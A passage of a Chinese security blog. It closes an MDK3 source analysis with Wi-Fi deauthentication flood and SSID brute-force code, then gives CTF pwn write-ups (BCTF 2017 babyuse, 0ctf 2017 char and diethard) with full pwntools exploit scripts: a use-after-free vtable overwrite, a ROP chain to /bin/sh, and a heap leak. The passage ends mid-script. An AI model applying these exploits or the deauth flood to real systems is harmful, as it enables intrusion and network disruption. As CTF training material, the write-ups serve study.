	<span class="built_in">memset</span>(brute_ssid, <span class="number">0</span>, (<span class="number">256</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>)));</div><div class="line">		ssid_len++;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">if</span> (max_permutations) <span class="built_in">printf</span>(<span class="string">"\nall %d possible SSIDs sent.\n"</span>, turns<span class="number">-1</span>);</div><div class="line">		<span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">"\nall %d possible SSIDs sent.\n"</span>, max_permutations);</div><div class="line">		exit_now = <span class="number">1</span>;</div><div class="line">	    &#125;</div><div class="line">	&#125;</div><div class="line"><span class="comment">//-&gt; return packet containing SSID</span></div><div class="line">	<span class="keyword">return</span> create_probe_frame(ssid, generate_mac(<span class="number">1</span>));</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> pkt;</div></pre></td></tr></table></figure></p>
<p>这里则是爆破生成SSID进行探测，还有另外一个<code>ssid_brute()</code>函数则是从文件中读取要爆破的SSID  </p>
<h2 id="强制断开验证"><a href="#强制断开验证" class="headerlink" title="强制断开验证"></a>强制断开验证</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'d'</span>:</div><div class="line">    frm = amok_machine(list_file);</div><div class="line">    <span class="keyword">break</span>;</div></pre></td></tr></table></figure>
<p>这个模式下会不断的发送断开验证的数据包，强制瘫痪掉一部分无线网络<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">case</span> <span class="string">'d'</span>:</div><div class="line">	mode = <span class="string">'d'</span>;</div><div class="line">	<span class="keyword">for</span> (t=<span class="number">3</span>; t&lt;argc; t++)</div><div class="line">	&#123;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-s"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) &#123;</div><div class="line">		pps = strtol(argv[t+<span class="number">1</span>], (<span class="keyword">char</span> **) <span class="literal">NULL</span>, <span class="number">10</span>);</div><div class="line">		usespeed = <span class="number">1</span>;</div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-w"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) &#123;</div><div class="line">		<span class="keyword">if</span> (wblist != <span class="number">0</span>) &#123; <span class="built_in">printf</span>(use_deau); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</div><div class="line">		load_whitelist(argv[t+<span class="number">1</span>]);</div><div class="line">		list_file = argv[t+<span class="number">1</span>];</div><div class="line">		wblist = <span class="number">1</span>;</div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-b"</span>)) <span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) &#123;</div><div class="line">		<span class="keyword">if</span> (wblist != <span class="number">0</span>) &#123; <span class="built_in">printf</span>(use_deau); <span class="keyword">return</span> <span class="number">-1</span>; &#125;</div><div class="line">		load_whitelist(argv[t+<span class="number">1</span>]);</div><div class="line">		list_file = argv[t+<span class="number">1</span>];</div><div class="line">		wblist = <span class="number">2</span>;</div><div class="line">	    &#125;</div><div class="line">	    <span class="keyword">if</span> (! <span class="built_in">strcmp</span>(argv[t], <span class="string">"-c"</span>)) &#123;</div><div class="line">		<span class="keyword">if</span> (argc &gt; t+<span class="number">1</span>) &#123;</div><div class="line">		    <span class="comment">// There is a channel list given</span></div><div class="line">		    init_channel_hopper(argv[t+<span class="number">1</span>], <span class="number">3</span>);</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">		    <span class="comment">// No list given</span></div><div class="line">		    init_channel_hopper(<span class="literal">NULL</span>, <span class="number">3</span>);</div><div class="line">		&#125;</div><div class="line">	    &#125;</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>这里可以看出这个模式支持白名单,指定发包速率和指定信道<br>现在我们看看所使用的<code>amok_machine()</code>函数<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">case 0:</div><div class="line">	    newone:</div><div class="line"></div><div class="line">	    if (wblist) &#123;			//Periodically re-read list every LIST_REREAD_PERIOD sec.</div><div class="line">		if (t_prev == 0) &#123;</div><div class="line">		    printf("Periodically re-reading blacklist/whitelist every %d seconds\n\n", LIST_REREAD_PERIOD);</div><div class="line">		&#125;</div><div class="line">		if (time(NULL) - t_prev &gt;= LIST_REREAD_PERIOD) &#123;</div><div class="line">		    t_prev = time( NULL );</div><div class="line">		    load_whitelist(filename);</div><div class="line">		&#125;</div><div class="line">	    &#125;</div><div class="line"></div><div class="line">	    pkt_amok = get_target_deauth();</div><div class="line">	    if ((pkt_amok[1] &amp; '\x01') &amp;&amp; (pkt_amok[1] &amp; '\x02')) &#123;	// WDS packet</div><div class="line">		mac_sa = pkt_amok + 4;</div><div class="line">		mac_ta = pkt_amok + 10;</div><div class="line">		wds = 1;</div><div class="line">	    &#125;</div><div class="line">	    else if (pkt_amok[1] &amp; '\x01') &#123;		// ToDS packet</div><div class="line">		mac_ta = pkt_amok + 4;</div><div class="line">		mac_sa = pkt_amok + 10;</div><div class="line">		wds = 0;</div><div class="line">	    &#125;</div><div class="line">	    else if (pkt_amok[1] &amp; '\x02') &#123;		// FromDS packet</div><div class="line">		mac_sa = pkt_amok + 4;</div><div class="line">		mac_ta = pkt_amok + 10;</div><div class="line">		wds = 0;</div><div class="line">	    &#125;</div><div class="line">	    else if ((!(pkt_amok[1] &amp; '\x01')) &amp;&amp; (!(pkt_amok[1] &amp; '\x02'))) &#123;	//AdHoc packet</div><div class="line">		mac_sa = pkt_amok + 10;</div><div class="line">		mac_ta = pkt_amok + 16;</div><div class="line">		wds = 0;</div><div class="line">	    &#125;</div><div class="line">	    else &#123;</div><div class="line">		goto newone;</div><div class="line">	    &#125;</div><div class="line"></div><div class="line">	    if (wblist == 2) &#123;			//Using Blacklist mode - Skip if neither Client nor AP is in list</div><div class="line">		if (!(is_whitelisted(mac_ta)) &amp;&amp; !((is_whitelisted(mac_sa))))</div><div class="line">		    goto newone;</div><div class="line">	    &#125;</div><div class="line">            if (wblist == 1) &#123;			//Using Whitelist mode - Skip if Client or AP is in list</div><div class="line">		if (is_whitelisted(mac_ta)) goto newone;</div><div class="line">		if (is_whitelisted(mac_sa)) goto newone;</div><div class="line">	    &#125;</div><div class="line"></div><div class="line">	    state = 1;</div><div class="line">	    return create_deauth_frame(mac_ta, mac_sa, mac_ta, 1);</div></pre></td></tr></table></figure></p>
<p>这里指代的是默认的case，主要是根据黑白名单过滤掉相应的mac地址，然后再设置数据包内容，其他case大同小异，细节不同而已  </p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>MDK3其实还有其他很多有趣的功能，也有很多值得我们去分析，整个MDK3.c大概4K行，我可能看了大概不到一半，还是有很多东西值得我们去深究的  </p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/code/">code</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/homework/">homework</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-BCTF-2017-babyuse" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/05/05/BCTF-2017-babyuse/" class="article-date">
  	<time datetime="2017-05-05T01:01:56.000Z" itemprop="datePublished">2017-05-05</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/05/05/BCTF-2017-babyuse/">
        BCTF 2017 babyuse
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="babyuse"><a href="#babyuse" class="headerlink" title="babyuse"></a>babyuse</h2><p>使用武器时存在UAF，不要选择，把下标为0的武器删除再使用即可，最后改vatable成员为libc中的one-gadget即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'info'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(p, type, length, name)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'7. Exit\n'</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'2. QBZ95\n'</span>)</div><div class="line">    p.send(str(type) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">    p.send(str(length) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input name:\n'</span>)</div><div class="line">    p.send(name)</div><div class="line">    p.recvuntil(<span class="string">'7. Exit\n'</span>)</div><div class="line">    p.send(<span class="string">'8\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Drop</span><span class="params">(p, idx)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'7. Exit\n'</span>)</div><div class="line">    p.send(<span class="string">'6\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Choose a gun to delete:\n'</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'7. Exit\n'</span>)</div><div class="line">    p.send(<span class="string">'8\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Rename</span><span class="params">(p, idx, length, name)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'7. Exit\n'</span>)</div><div class="line">    p.send(<span class="string">'4\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Choose a gun to rename:\n'</span>)</div><div class="line">    p.send(str(idx) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">    p.send(str(length) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Input name:\n'</span>)</div><div class="line">    p.send(name)</div><div class="line">    p.recvuntil(<span class="string">'7. Exit\n'</span>)</div><div class="line">    p.send(<span class="string">'8\n'</span>)</div><div class="line"></div><div class="line"><span class="comment">#p = process('./babyuse_patched2', env = &#123;'LD_PRELOAD' : './libc.so'&#125;)</span></div><div class="line">p = remote(<span class="string">'202.112.51.247'</span>, <span class="number">3456</span>)</div><div class="line"></div><div class="line">REMOTE = <span class="keyword">True</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> REMOTE:</div><div class="line">    p.recvuntil(<span class="string">'Token:'</span>)</div><div class="line">    p.send(<span class="string">'yrkm0XEl56HqNPp8LrHuV0CRbvfW4aoT\n'</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">1</span>, <span class="number">0x7f</span>, <span class="string">'A'</span> * <span class="number">0x80</span>)</div><div class="line">New(p, <span class="number">1</span>, <span class="number">0x7f</span>, <span class="string">'B'</span> * <span class="number">0x80</span>)</div><div class="line">New(p, <span class="number">1</span>, <span class="number">0x7f</span>, <span class="string">'C'</span> * <span class="number">0x80</span>)</div><div class="line">Drop(p, <span class="number">0</span>)</div><div class="line">Drop(p, <span class="number">1</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'7. Exit\n'</span>)</div><div class="line">p.send(<span class="string">'5\n'</span>)</div><div class="line">p.recvuntil(<span class="string">'Select gun '</span>)</div><div class="line">main_arena = u32(p.recvn(<span class="number">4</span>))</div><div class="line"></div><div class="line">libc_base = main_arena - <span class="number">0x1b27b0</span></div><div class="line"></div><div class="line">log.info(<span class="string">"libc base: "</span> + hex(libc_base))</div><div class="line"></div><div class="line">heap_addr = u32(p.recvn(<span class="number">4</span>))</div><div class="line"></div><div class="line">log.info(<span class="string">"heap addr: "</span> + hex(heap_addr))</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'4. Main menu'</span>)</div><div class="line">p.send(<span class="string">'4\n'</span>)</div><div class="line"></div><div class="line">Drop(p, <span class="number">2</span>)</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += p32(<span class="number">0xdeadbeef</span>) * <span class="number">2</span></div><div class="line">payload += p32(libc_base + <span class="number">0x3ac69</span>)</div><div class="line">payload += p32(libc_base + <span class="number">0x5fbc5</span>)</div><div class="line">payload += p32(libc_base + <span class="number">0x5fbc6</span>)</div><div class="line"></div><div class="line">New(p, <span class="number">1</span>, <span class="number">0x7f</span>, payload + <span class="string">'\n'</span>)</div><div class="line">New(p, <span class="number">1</span>, <span class="number">0x1f</span>, <span class="string">'B'</span> * <span class="number">0x20</span>)</div><div class="line"></div><div class="line">fake_vtable = heap_addr - <span class="number">0xa8</span></div><div class="line"></div><div class="line">Drop(p, <span class="number">0</span>)</div><div class="line"></div><div class="line">Rename(p, <span class="number">1</span>, <span class="number">0x0f</span>, p32(fake_vtable) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-0ctf-2017-writeup" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/03/24/0ctf-2017-writeup/" class="article-date">
  	<time datetime="2017-03-24T15:02:47.000Z" itemprop="datePublished">2017-03-24</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/03/24/0ctf-2017-writeup/">
        0ctf 2017 writeup
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="char"><a href="#char" class="headerlink" title="char"></a>char</h2><p>很明显的栈溢出，但是程序会检查输入是否全为可打印字符，比较良心的是程序把一个libc映射到0x5555e000这个段上，算是让我们有点gadget可用<br>因为程序通过<code>strlen()</code>获取输入长度，所以我们可以在输入中间加上<code>&#39;\x00&#39;</code>来截断<code>strlen()</code>，这样只需要<code>&#39;\x00&#39;</code>之前的部分全为可打印字符，之后的payload不受影响<br>只需要找到合适的gadget让栈跳到后方返回就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line">base = <span class="number">0x5555e000</span></div><div class="line"></div><div class="line"><span class="comment">#0x0001706b : pop eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></div><div class="line">int80 = <span class="number">0x00B7E36</span></div><div class="line">pop5_ret = <span class="number">0x0001706b</span></div><div class="line">ret80 = <span class="number">0x00132d35</span></div><div class="line">ret52 = <span class="number">0x00004234</span></div><div class="line">pop4_ret10 = <span class="number">0x00017e76</span></div><div class="line">addesp9c_ret = <span class="number">0x000e3cee</span></div><div class="line">addesp98_pop_ret = <span class="number">0x0011cf7a</span></div><div class="line">mov_eax_ecx = <span class="number">0x00148251</span></div><div class="line">xchg_esp_eax = <span class="number">0x000e6d62</span></div><div class="line">add_esp1c_ret = <span class="number">0x00115f35</span></div><div class="line"></div><div class="line">p = process(<span class="string">'./char_patched'</span>)</div><div class="line"><span class="comment">#p = remote('202.120.7.214', 23222)</span></div><div class="line"></div><div class="line">ebx_ret = <span class="number">0x0007dce9</span></div><div class="line">edx_ecx_eax_ret = <span class="number">0x000f277f</span></div><div class="line"></div><div class="line">scanf_plt = <span class="number">0x08048540</span></div><div class="line">pop2_ret = <span class="number">0x804889a</span></div><div class="line">s2400 = <span class="number">0x804894C</span></div><div class="line">data = <span class="number">0x804A03C</span></div><div class="line">system_addr = <span class="number">0x003EED0</span> + base</div><div class="line">execve_addr = <span class="number">0x0003ECF2</span> + base</div><div class="line">eax_ret = <span class="number">0x0016a7d4</span> + base</div><div class="line">pop3_ret = <span class="number">0x8048899</span></div><div class="line">binsh = <span class="number">0x556bb7ec</span></div><div class="line"></div><div class="line">main_addr = <span class="number">0x08048693</span></div><div class="line">write_plt = <span class="number">0x8048520</span></div><div class="line">write_got = <span class="number">0x804A030</span></div><div class="line">puts_plt = <span class="number">0x80484B0</span></div><div class="line">scanf_got = <span class="number">0x804A038</span></div><div class="line">strcpy_got = <span class="number">0x0804A010</span></div><div class="line">strcpy_plt = <span class="number">0x080484A0</span></div><div class="line">libc_start_main_got = <span class="number">0x804A00C</span> + <span class="number">4</span></div><div class="line">edx_ret = <span class="number">0x00001a9e</span> + base</div><div class="line">ecx_ret = <span class="number">0x000cae3b</span> + base</div><div class="line"></div><div class="line">inc_eax_ret = <span class="number">0x00026a9b</span> + base</div><div class="line"></div><div class="line">log.info(hex(write_plt))</div><div class="line"></div><div class="line">payload = <span class="string">''</span></div><div class="line">payload += <span class="string">'A'</span> * <span class="number">28</span></div><div class="line">payload += p32(add_esp1c_ret + base)</div><div class="line">payload += p32(mov_eax_ecx + base)</div><div class="line">payload += p32(xchg_esp_eax + base)</div><div class="line">payload += <span class="string">'\x00'</span> * <span class="number">3</span></div><div class="line">payload += p32(<span class="number">0xdeadbeef</span>)</div><div class="line">payload += p32(<span class="number">0xdeadbeef</span>) * <span class="number">5</span></div><div class="line">payload += p32(ebx_ret + base)</div><div class="line">payload += p32(binsh)</div><div class="line">payload += p32(edx_ret)</div><div class="line">payload += p32(<span class="number">0x00</span>)</div><div class="line">payload += p32(ecx_ret)</div><div class="line">payload += p32(<span class="number">0x00</span>)</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>):</div><div class="line">	payload += p32(inc_eax_ret)</div><div class="line"></div><div class="line">payload += p32(int80 + base)</div><div class="line"></div><div class="line">pause()</div><div class="line"></div><div class="line">log.info(len(payload))</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'GO : ) \n'</span>)</div><div class="line">p.send(payload + <span class="string">'\n'</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="diethard"><a href="#diethard" class="headerlink" title="diethard"></a>diethard</h2><p>一个自己实现的内存管理系统，程序会根据申请内存的大小分配一个类似index的东西，相同index的堆块会分配到同一页，计算了一下发现index为8时，对应的对块大小集合元素最多<br>其中分配1032和2016大小的堆块会出bug，不用释放内存就出现堆块重叠了。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'info'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(p, length, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">"3. Exit\n\n"</span>)</div><div class="line">    p.send(<span class="string">'1\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">"Input Message Length:\n"</span>)</div><div class="line">    p.send(str(length) + <span class="string">'\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">"Please Input Message:\n"</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(p, index)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">"3. Exit\n\n"</span>)</div><div class="line">    p.send(<span class="string">'2\n'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Which Message You Want To Delete?\n'</span>)</div><div class="line">    p.send(str(index) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line"></div><div class="line">    <span class="comment">#p = process('./diethard')</span></div><div class="line">    p = remote(<span class="string">'202.120.7.194'</span>, <span class="number">6666</span>)</div><div class="line"></div><div class="line">    New(p, <span class="number">1032</span>, <span class="string">'A\n'</span>)</div><div class="line">    New(p, <span class="number">1032</span>, <span class="string">'GGGGGGGGGGGGGGGG\n'</span>)</div><div class="line">    New(p, <span class="number">2016</span>, <span class="string">'C\n'</span>)</div><div class="line"></div><div class="line">    p.recvuntil(<span class="string">"3. Exit\n\n"</span>)</div><div class="line">    p.send(<span class="string">'2\n'</span>)</div><div class="line"></div><div class="line">    p.recvuntil(<span class="string">'2.'</span>)</div><div class="line">    data = p.recvuntil(<span class="string">'GGGGGGGGGGGGGGGG'</span>, drop = <span class="keyword">True</span>)[<span class="number">-16</span>:]</div><div class="line">    p.recvuntil(<span class="string">'Which Message You Want To Delete?\n'</span>)</div><div class="line">    p.send(str(<span class="number">6</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">    heap_addr = u64(data[:<span class="number">8</span>])</div><div class="line"></div><div class="line">    log.info(<span class="string">"heap addr: "</span> + hex(heap_addr))</div><div class="line"></div><div class="line">    Delete(p, <span class="number">2</span>)</div><div class="line">    Delete(p, <span class="number">1</span>)</div><div class="line">    Delete(p, <span class="number">0</span>)</div><div class="line"></div><div class="line">    <span class="string">'''</span></div><div class="line">    0x7fb7d3d0b800:    0x0000000000000043    0x0000000000000408</div><div class="line">    0x7fb7d3d0b810:    0x00007fb7d3d0b820    0x0000000000400976</div><div class="line">    0x7fb7d3d0b820:    0x4747474747474747    0x4747474747474747</div><div class="line">    '''</div><div class="line">    payload = <span class="string">''</span></div><div class="line">    payload += p64(<span class="number">0x43</span>)</div><div class="line">    payload += p64(<span class="number">0x408</span>)</div><div class="line">    payload += p64(<span class="number">0x000000000603280</span>)</div><div class="line">    payload += p64(<span class="number">0x400976</span>)</div><div class="line"></div><div class="line">    New(p, <span class="number">1032</span>, <span class="string">'A\n'</span>)</div><div class="line">    New(p, <span class="number">1032</span>, <span class="string">'GGGGGGGGGGGGGGGG\n'</span>)</div><div class="line">    New(p, <span class="number">2016</span>, payload + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">    p.recvuntil(<span class="string">"3. Exit\n\n"</span>)</div><div class="line">    p.send(<span class="string">'2\n'</span>)</div><div class="line"></div><div class="line">    p.recvuntil(<span class="string">'1. '</span>)</div><div class="line"></div><div class="line">    libc_start_main_addr = u64(p.recvn(<span class="number">8</span>))</div><div class="line">    log.info(<span class="string">'__libc_start_main() addr: '</span> + hex(libc_start_main_addr))</div><div class="line"></div><div class="line">    p.recvuntil(<span class="string">'Which Message You Want To Delete?\n'</span>)</div><div class="line">    p.send(str(<span class="number">6</span>) + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line">    <span class="comment">#libc = ELF('./local.libc64')</span></div><div class="line">    libc = ELF(<span class="string">'./libc.so'</span>)</div><div class="line"></div><div class="line">    offset_libc_start_main = libc.symbols[<span class="string">'__libc_start_main'</span>]</div><div class="line">    offset_system = libc.symbols[<span class="string">'system'</span>]</div><div class="line">    offset_binsh = next(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line"></div><div class="line">    libc_base = libc_start_main_addr - offset_libc_start_main</div><div class="line">    system_addr = libc_base + offset_system</div><div class="line">    binsh_addr = libc_base + offset_binsh</div><div class="line"></div><div class="line">    Delete(p, <span class="number">2</span>)</div><div class="line">    Delete(p, <span class="number">1</span>)</div><div class="line">    Delete(p, <span 